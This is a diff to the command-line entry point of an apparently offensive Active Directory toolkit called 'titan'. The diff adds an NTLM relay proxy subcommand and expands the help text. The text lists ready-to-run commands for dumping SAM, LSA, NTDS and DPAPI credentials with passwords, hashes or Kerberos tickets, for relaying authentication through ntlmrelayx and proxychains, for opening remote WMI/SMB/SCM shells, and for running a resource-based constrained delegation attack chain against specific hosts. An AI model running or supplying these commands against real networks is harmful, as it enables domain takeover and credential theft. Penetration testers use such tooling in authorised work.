@@ -7,9 +7,10 @@ Think secretsdump + evil-winrm + RBCD, with impacket-compatible flags.
 Usage: titan <subcommand> [options]
 
 Subcommands:
-  dump    Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
-  shell   Interactive WMI+SMB shell (evil-winrm-style)
-  rbcd    Resource-Based Constrained Delegation attack chain
+  dump         Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
+  shell        Interactive WMI+SMB shell (evil-winrm-style)
+  rbcd         Resource-Based Constrained Delegation attack chain
+  relay-proxy  SMB2 credit-booster proxy for ntlmrelayx --socks
 
 Run  titan <subcommand> -h  for per-subcommand help.
 
@@ -18,8 +19,13 @@ Quick examples:
   titan dump -u Administrator -d ECORP -p 'P@ss' --ntds -t 192.168.15.40
   titan dump -u Administrator -d ECORP -hashes :NThash -t 192.168.15.40
   KRB5CCNAME=Administrator.ccache titan dump -k -no-pass -t 192.168.15.40
-  proxychains titan dump -u administrator -d ECORP --no-pass -t 192.168.15.40
+
+  # ntlmrelayx --socks relay (start relay-proxy first, point proxychains at :1082):
+  titan relay-proxy                                    # boosts credits in-flight
+  proxychains titan dump DOMAIN/user@<ip> --no-pass    # proxychains → :1082 → ntlmrelayx
+
   titan shell ECORP/Administrator:'P@ss'@192.168.15.42
+  titan shell --scm BRENHAMCITY/SCSUITE2@192.168.14.157 --no-pass  # SCM over port 445
   titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
 """
 
@@ -48,6 +54,9 @@ def main():
         _m()
     elif sub == 'rbcd':
         from titanlib.rbcd import main as _m
+        _m()
+    elif sub == 'relay-proxy':
+        from titanlib.relay_proxy import main as _m
         _m()
     else:
         print(f'[!] Unknown subcommand: {sub!r}\n', file=sys.stderr)
